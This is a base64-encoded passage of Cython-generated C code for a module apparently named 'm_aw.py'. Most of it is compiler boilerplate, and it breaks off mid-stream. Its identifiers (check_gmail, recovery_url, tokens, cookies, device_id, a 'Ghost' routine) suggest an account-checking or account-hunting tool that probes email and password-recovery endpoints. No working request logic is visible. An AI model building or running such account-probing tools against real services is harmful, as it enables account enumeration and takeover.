iAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxOSA9IFB5TG9uZ19Gcm9tTG9uZygyMDE5KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDE5KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMjAgPSBQeUxvbmdfRnJvbUxvbmcoMjAyMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAyMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDIxID0gUHlMb25nX0Zyb21Mb25nKDIwMjEpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMjEpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAyMiA9IFB5TG9uZ19Gcm9tTG9uZygyMDIyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDIyKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMjMgPSBQeUxvbmdfRnJvbUxvbmcoMjAyMyk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAyMykpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xMjc4ODg5ID0gUHlMb25nX0Zyb21Mb25nKDEyNzg4ODlMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xMjc4ODg5KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzEyNzkwMDAgPSBQeUxvbmdfRnJvbUxvbmcoMTI3OTAwMEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzEyNzkwMDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTc3NTAwMDAgPSBQeUxvbmdfRnJvbUxvbmcoMTc3NTAwMDBMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xNzc1MDAwMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xNzc1MDAwMSA9IFB5TG9uZ19Gcm9tTG9uZygxNzc1MDAwMUwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzE3NzUwMDAxKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzI3OTc2MDAwMCA9IFB5TG9uZ19Gcm9tTG9uZygyNzk3NjAwMDBMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yNzk3NjAwMDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjc5NzYwMDAxID0gUHlMb25nX0Zyb21Mb25nKDI3OTc2MDAwMUwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzI3OTc2MDAwMSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF85MDA5OTAwMDAgPSBQeUxvbmdfRnJvbUxvbmcoOTAwOTkwMDAwTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfOTAwOTkwMDAwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzkwMDk5MDAwMSA9IFB5TG9uZ19Gcm9tTG9uZyg5MDA5OTAwMDFMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF85MDA5OTAwMDEpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTYyOTAxMDAwMCA9IFB5TG9uZ19Gcm9tTG9uZygxNjI5MDEwMDAwTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTYyOTAxMDAwMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xNjI5MDEwMDAxID0gUHlMb25nX0Zyb21Mb25nKDE2MjkwMTAwMDFMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xNjI5MDEwMDAxKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIzNjkzNTk3NjEgPSBQeUxvbmdfRnJvbVN0cmluZygiMjM2OTM1OTc2MSIsIDAsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIzNjkzNTk3NjEpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjM2OTM1OTc2MiA9IFB5TG9uZ19Gcm9tU3RyaW5nKCIyMzY5MzU5NzYyIiwgMCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjM2OTM1OTc2MikpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF80MjM5NTE2NzU0ID0gUHlMb25nX0Zyb21TdHJpbmcoIjQyMzk1MTY3NTQiLCAwLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF80MjM5NTE2NzU0KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzQyMzk1MTY3NTUgPSBQeUxvbmdfRnJvbVN0cmluZygiNDIzOTUxNjc1NSIsIDAsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzQyMzk1MTY3NTUpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfNjM0NTEwODIwOSA9IFB5TG9uZ19Gcm9tU3RyaW5nKCI2MzQ1MTA4MjA5IiwgMCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfNjM0NTEwODIwOSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF82MzQ1MTA4MjEwID0gUHlMb25nX0Zyb21TdHJpbmcoIjYzNDUxMDgyMTAiLCAwLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF82MzQ1MTA4MjEwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzEwMDE2MjMyMzk1ID0gUHlMb25nX0Zyb21TdHJpbmcoIjEwMDE2MjMyMzk1IiwgMCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTAwMTYyMzIzOTUpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTAwMTYyMzIzOTYgPSBQeUxvbmdfRnJvbVN0cmluZygiMTAwMTYyMzIzOTYiLCAwLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xMDAxNjIzMjM5NikpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yNzIzODYwMjE1OSA9IFB5TG9uZ19Gcm9tU3RyaW5nKCIyNzIzODYwMjE1OSIsIDAsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzI3MjM4NjAyMTU5KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzI3MjM4NjAyMTYwID0gUHlMb25nX0Zyb21TdHJpbmcoIjI3MjM4NjAyMTYwIiwgMCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjcyMzg2MDIxNjApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfNDM0NjQ0NzUzOTUgPSBQeUxvbmdfRnJvbVN0cmluZygiNDM0NjQ0NzUzOTUiLCAwLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF80MzQ2NDQ3NTM5NSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF80MzQ2NDQ3NTM5NiA9IFB5TG9uZ19Gcm9tU3RyaW5nKCI0MzQ2NDQ3NTM5NiIsIDAsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzQzNDY0NDc1Mzk2KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzUwMjg5Mjk3NjQ3ID0gUHlMb25nX0Zyb21TdHJpbmcoIjUwMjg5Mjk3NjQ3IiwgMCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfNTAyODkyOTc2NDcpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfNTAyODkyOTc2NDggPSBQeUxvbmdfRnJvbVN0cmluZygiNTAyODkyOTc2NDgiLCAwLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF81MDI4OTI5NzY0OCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF81NzQ2NDcwNzA4MiA9IFB5TG9uZ19Gcm9tU3RyaW5nKCI1NzQ2NDcwNzA4MiIsIDAsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzU3NDY0NzA3MDgyKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzU3NDY0NzA3MDgzID0gUHlMb25nX0Zyb21TdHJpbmcoIjU3NDY0NzA3MDgzIiwgMCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfNTc0NjQ3MDcwODMpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfNjMzMTM0MjY5MzggPSBQeUxvbmdfRnJvbVN0cmluZygiNjMzMTM0MjY5MzgiLCAwLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF82MzMxMzQyNjkzOCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICByZXR1cm4gMDsKICBfX3B5eF9MMV9lcnJvcjo7CiAgcmV0dXJuIC0xOwp9Cgp0eXBlZGVmIHN0cnVjdCB7CiAgICB1bnNpZ25lZCBpbnQgYXJnY291bnQgOiAyOwogICAgdW5zaWduZWQgaW50IG51bV9wb3Nvbmx5X2FyZ3MgOiAxOwogICAgdW5zaWduZWQgaW50IG51bV9rd29ubHlfYXJncyA6IDE7CiAgICB1bnNpZ25lZCBpbnQgbmxvY2FscyA6IDU7CiAgICB1bnNpZ25lZCBpbnQgZmxhZ3MgOiAxMDsKICAgIHVuc2lnbmVkIGludCBmaXJzdF9saW5lIDogOTsKICAgIHVuc2lnbmVkIGludCBsaW5lX3RhYmxlX2xlbmd0aCA6IDE0Owp9IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb247CgpzdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5Q29kZV9OZXcoCiAgICAgICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciwKICAgICAgICBQeU9iamVjdCAqIGNvbnN0ICp2YXJuYW1lcywKICAgICAgICBQeU9iamVjdCAqZmlsZW5hbWUsCiAgICAgICAgUHlPYmplY3QgKmZ1bmNuYW1lLAogICAgICAgIGNvbnN0IGNoYXIgKmxpbmVfdGFibGUsCiAgICAgICAgUHlPYmplY3QgKnR1cGxlX2RlZHVwX21hcAopOwoKCnN0YXRpYyBpbnQgX19QeXhfQ3JlYXRlQ29kZU9iamVjdHMoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7CiAgUHlPYmplY3QqIHR1cGxlX2RlZHVwX21hcCA9IFB5RGljdF9OZXcoKTsKICBpZiAodW5saWtlbHkoIXR1cGxlX2RlZHVwX21hcCkpIHJldHVybiAtMTsKICB7CiAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyID0gezAsIDAsIDAsIDEsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFN8Q09fR0VORVJBVE9SKSwgMTI0LCAyfTsKICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X18yNX07CiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlswXSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV9hd19weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfa18xXzIsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMF0pKSBnb3RvIGJhZDsKICB9CiAgewogICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHswLCAwLCAwLCAxLCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTfENPX0dFTkVSQVRPUiksIDEyNSwgMn07CiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9fMjV9OwogICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMV0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fYXdfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X2tfMV8yLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzFdKSkgZ290byBiYWQ7CiAgfQogIHsKICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MCwgMCwgMCwgMSwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMU3xDT19HRU5FUkFUT1IpLCAxMjYsIDJ9OwogICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3VfXzI1fTsKICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzJdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX2F3X3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9nZW5leHByLCBfX3B5eF9rX1EsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMl0pKSBnb3RvIGJhZDsKICB9CiAgewogICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHswLCAwLCAwLCAyLCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTKSwgODksIDU1fTsKICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X3RsbiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfY2hhcn07CiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlszXSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV9hd19weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdGluZm8sIF9fcHl4X2tfN18xXzFfN19GXzEsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbM10pKSBnb3RvIGJhZDsKICB9CiAgewogICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHswLCAwLCAwLCA0LCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTKSwgMTA4LCA5Mn07CiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9TZXh5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9TZXgsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X1h4eCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfc3RhdHNfbGluZX07CiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls0XSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV9hd19weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcHBwcCwgX19weXhfa18xX0JhXzR0X1RfaXRTZ2dxcXVfdl9XX1dfRl9UX1YxLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzRdKSkgZ290byBiYWQ7CiAgfQogIHsKICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MCwgMCwgMCwgMCwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDExNywgN307CiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHswfTsKICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzVdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX2F3X3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV91cGRhdGVfc3RhdHMsIF9fcHl4X2tfXzI3LCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzVdKSkgZ290byBiYWQ7CiAgfQogIHsKICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MCwgMCwgMCwgMjAsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFMpLCAxMjEsIDQxM307CiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9hbHBoYWJldCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfbjEsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X24yLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9ob3N0LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9yZWNvdmVyeV91cmwsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3JlczEsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X21hdGNoLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV90b2ssIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2Nvb2tpZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2hlYWRlcnMyLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9yZXNwb25zZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdG9rZW5fbGluZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwcn07CiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls2XSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV9hd19weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfR2hvc3QsIF9fcHl4X2tfMV9SdUcxX1J1RzFfcl9nUV9hX3FfUV9pcV9BX1FfQywgdHVwbGVfZGVkdXBfbWFwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls2XSkpIGdvdG8gYmFkOwogIH0KICB7CiAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyID0gezEsIDAsIDAsIDEyLCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTKSwgMTc2LCAzMTd9OwogICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZW1haWwsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2YsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3Rva2VuX2RhdGEsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3RsLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9ob3N0LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9jb29raWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9wYXJhbXMsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2RhdGEsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3Jlc3BvbnNlLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9mdWxsX2VtYWlsLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9lfTsKICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzddID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX2F3X3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9jaGVja19nbWFpbCwgX19weXhfa180c19FX3FfQVFfMU84MV9yX0JhcV9HX1YxQV9RXzlBLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzddKSkgZ290byBiYWQ7CiAgfQogIHsKICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MSwgMCwgMCwgOCwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDIxNywgMjQzfTsKICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X2VtYWlsLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV91YSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZGV2LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9kZXZpY2VfaWQsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3V1aSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaGVhZGVycywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZGF0YSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcmVzcG9uc2V9OwogICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbOF0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fYXdfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2NoZWNrLCBfX3B5eF9rX0FfQmdUX1FkXzdfWnJfMV9RZF9JUWFfMUFfUFBRX2EsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbOF0pKSBnb3RvIGJhZDsKICB9CiAgewogICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHsxLCAwLCAwLCA1LCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTKSwgMjUzLCAyMjd9OwogICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdXNlciwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaGVhZGVycywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZGF0YSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcmVzcG9uc2UsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2V9OwogICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbOV0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fYXdfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3Jlc3QsIF9fcHl4X2tfMV9hX1FfMV8xXzFfQV8xX1FfUV9xX1FfUV9pcV9xLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzldKSkgZ290byBiYWQ7CiAgfQogIHsKICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MiwgMCwgMCwgMTIsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFMpLCAyOTgsIDUxM307CiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV91c2VybmFtZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3Vf